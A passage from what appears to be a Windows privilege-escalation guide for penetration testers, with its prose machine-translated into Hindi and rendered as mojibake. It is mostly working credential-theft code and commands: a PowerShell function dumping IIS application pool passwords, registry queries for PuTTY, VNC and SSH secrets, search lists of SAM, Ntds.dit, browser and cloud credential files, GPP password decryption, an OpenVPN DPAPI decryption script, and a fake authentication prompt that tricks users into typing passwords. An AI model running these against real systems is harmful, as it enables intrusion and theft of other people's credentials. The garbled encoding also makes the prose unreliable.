$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ `C:\Windows\CCM\SCClient.exe` рдореМрдЬреВрдж рд╣реИред\
рдЗрдВрд╕реНрдЯреЙрд▓рд░ **SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ**, рдмрд╣реБрдд рд╕реЗ **DLL Sideloading** рдХреЗ рд▓рд┐рдП рд╡рдВрд░реНрдгрди (рдЬрд╛рдирдХрд╛рд░реА [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc) рд╕реЗ)ред
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА (рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕)

### Putty рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### рдкреБрдЯреА SSH рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ SSH рдХреБрдВрдЬреА

SSH рдирд┐рдЬреА рдХреБрдВрдЬрд┐рдпрд╛рдБ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА `HKCU\Software\OpenSSH\Agent\Keys` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╡рд╣рд╛рдБ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдирд╣реАрдВ:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
рдпрджрд┐ рдЖрдк рдЙрд╕ рдкрде рдореЗрдВ рдХреЛрдИ рдПрдВрдЯреНрд░реА рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рд╢рд╛рдпрдж рд╡рд╣рд╛рдВ рдПрдХ рд╕рд╣реЗрдЬреА рдЧрдИ SSH рдХреБрдВрдЬреА рд╣реЛред рдпрд╣ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ рд▓реЗрдХрд┐рди [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

рдпрджрд┐ `ssh-agent` рд╕реЗрд╡рд╛ рдЪрд▓ рдирд╣реАрдВ рд░рд╣реА рд╣реИ рдФрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдмреВрдЯ рдкрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЪрд╛рд▓реВ рд╣реЛ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдБ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдЕрдм рд╡реИрдз рдирд╣реАрдВ рд╣реИред рдореИрдВрдиреЗ рдХреБрдЫ ssh рдХреБрдВрдЬреА рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА, рдЙрдиреНрд╣реЗрдВ `ssh-add` рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдФрд░ ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рдорд╢реАрди рдкрд░ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреАред рд░рдЬрд┐рд╕реНрдЯреНрд░реА HKCU\Software\OpenSSH\Agent\Keys рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдФрд░ procmon рдиреЗ asymmetric key рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди `dpapi.dll` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдкрд╣рдЪрд╛рдирд╛ред
{% endhint %}

### рдЕрдирдЕрдЯреЗрдВрдбреЗрдб рдлрд╝рд╛рдЗрд▓реЗрдВ
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
рдЖрдк рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **metasploit** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: _post/windows/gather/enum\_unattend_

рдЙрджрд╛рд╣рд░рдг рд╕рд╛рдордЧреНрд░реА:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM рдФрд░ SYSTEM рдмреИрдХрдЕрдк
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### рдХреНрд▓рд╛рдЙрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** рдирд╛рдордХ рдлрд╝рд╛рдЗрд▓ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ

### Cached GPP Password

рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рдкрд╣рд▓реЗ рдЙрдкрд▓рдмреНрдз рдереА рдЬрд┐рд╕рдиреЗ рд╕рдореВрд╣ рдиреАрддрд┐ рд╡рд░реАрдпрддрд╛рдУрдВ (GPP) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдИ рдорд╢реАрдиреЛрдВ рдкрд░ рдХрд╕реНрдЯрдо рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЛрдВ рдХрд╛ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдереАред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдереЗред рдкрд╣рд▓реЗ, рд╕рдореВрд╣ рдиреАрддрд┐ рд╡рд╕реНрддреБрдУрдВ (GPOs), SYSVOL рдореЗрдВ XML рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд, рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рдереЗред рджреВрд╕рд░рд╛, рдЗрди GPPs рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдкрд╛рд╕рд╡рд░реНрдб, рдЬреЛ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рджрд╕реНрддрд╛рд╡реЗрдЬреАрдХреГрдд рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ AES256 рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рдереЗ, рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рдереЗред рдпрд╣ рдПрдХ рдЧрдВрднреАрд░ рдЬреЛрдЦрд┐рдо рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рдерд╛ред

рдЗрд╕ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдХрд╛рд░реНрдп рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдХреИрд╢ рдХрд┐рдП рдЧрдП GPP рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ "cpassword" рдлрд╝реАрд▓реНрдб рдЦрд╛рд▓реА рдирд╣реАрдВ рд╣реИред рдРрд╕реА рдлрд╝рд╛рдЗрд▓ рдкрд╛рдиреЗ рдкрд░, рдлрд╝рдВрдХреНрд╢рди рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдХрд╕реНрдЯрдо PowerShell рдСрдмреНрдЬ
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
рдХреНрд░реИрдХрдореИрдкреЗрдХреНрдЬреЗрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS рд╡реЗрдм рдХреЙрдиреНрдлрд╝рд┐рдЧ
```powershell
Get-Childitem тАУPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem тАУPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem тАУPath C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
рд╡реЗрдм.рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЬрд┐рд╕рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╣реИрдВ:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### рд▓реЙрдЧреНрд╕
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem тАУPath C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### рдкреНрд░рдорд╛рдг рдкрддреНрд░ рдорд╛рдВрдЧреЗрдВ

рдЖрдк рд╣рдореЗрд╢рд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЙрдирдХреЗ рдкреНрд░рдорд╛рдг рдкрддреНрд░ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрдЫ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдЙрдиреНрд╣реЗрдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдХрд┐рд╕реА рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рдорд╛рдг рдкрддреНрд░ рднреА рдорд╛рдВрдЧ рд╕рдХрддреЗ рд╣реИрдВ** (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреНрд░рдорд╛рдг рдкрддреНрд░** рдХреЗ рд▓рд┐рдП рдЧреНрд░рд╛рд╣рдХ рд╕реЗ **рдорд╛рдВрдЧрдирд╛** рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдЬреЛрдЦрд┐рдордкреВрд░реНрдг** рд╣реИ):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **рдкрд╛рд╕рд╡рд░реНрдб рд╕рдореЗрдд рд╕рдВрднрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓ рдирд╛рдо**

рдЬреНрдЮрд╛рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬрд┐рдирдореЗрдВ рдХрднреА **рдкрд╛рд╕рд╡рд░реНрдб** **рд╕реНрдкрд╖реНрдЯ-рдкрд╛рда** рдпрд╛ **Base64** рдореЗрдВ рдереЗ
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
рдЙрди рд╕рднреА рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдЦреЛрдЬреЗрдВ:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem тАУPath C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд░реАрд╕рд╛рдЗрдХрд▓ рдмрд┐рди рдореЗрдВ

рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

**рдХрдИ рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рд╣реЗрдЬреЗ рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ рдЕрдВрджрд░

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдЕрдиреНрдп рд╕рдВрднрд╛рд╡рд┐рдд рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ openssh рдХреБрдВрдЬреА рдирд┐рдХрд╛рд▓реЗрдВред**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрддрд┐рд╣рд╛рд╕

рдЖрдкрдХреЛ рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ dbs рдореЗрдВ **Chrome рдпрд╛ Firefox** рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреЛрд░ рд╣реЛ рд░рд╣реЗ рд╣реИрдВред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЗ рдЗрддрд┐рд╣рд╛рд╕, рдмреБрдХрдорд╛рд░реНрдХреНрд╕ рдФрд░ рдкрд╕рдВрджреАрджрд╛ рдЬрд╛рдВрдЪреЗрдВ рддрд╛рдХрд┐ рдХреБрдЫ **рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреЛрд░** рд╣реЛ рд╕рдХреЗрдВред

рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL рдЕрдзрд┐рдХрд▓реЗрдЦрди**

**Component Object Model (COM)** рдПрдХ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рд╣реИ рдЬреЛ Windows рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рднреАрддрд░ рдирд┐рд░реНрдорд┐рдд рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдШрдЯрдХреЛрдВ рдХреЗ рдмреАрдЪ **рдЕрдВрддрд░рд╕рдВрдЪрд╛рд░** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдкреНрд░рддреНрдпреЗрдХ COM рдШрдЯрдХ рдХреЛ рдПрдХ рдХрдХреНрд╖рд╛ рдЖрдИрдбреА (CLSID) рджреНрд╡рд╛рд░рд╛ **рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдШрдЯрдХ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдЗрдВрдЯрд░рдлреЗрд╕ рдЖрдИрдбреА (IIDs) рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

COM рдХрдХреНрд╖рд╛рдПрдБ рдФрд░ рдЗрдВрдЯрд░рдлреЗрд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** рдФрд░ **HKEY\_**_**CLASSES\_**_**ROOT\Interface** рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред

рдЗрд╕ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЗ CLSIDs рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди рд╡рд╛рд▓рд╛ рд╡реИрд▓реНрдпреВ рд░рдЦрдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдбреАрдПрд▓рдПрд▓ рдФрд░ рдПрдХ рдорд╛рди рдЬреИрд╕реЗ **ThreadingModel** рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single рдпрд╛ Multi) рдпрд╛ **Neutral** (Thread Neutral) рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (638).png>)

рдЖрдо рддреМрд░ рдкрд░, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА DLL рдХреЛ **рдЕрдзрд┐рдХрд▓реЗрдЦрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐рд╕реА рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рддреЛ рдпрджрд┐ рд╡рд╣ DLL рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рдЖрдк **рд╡рд░реАрдпрддрд╛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

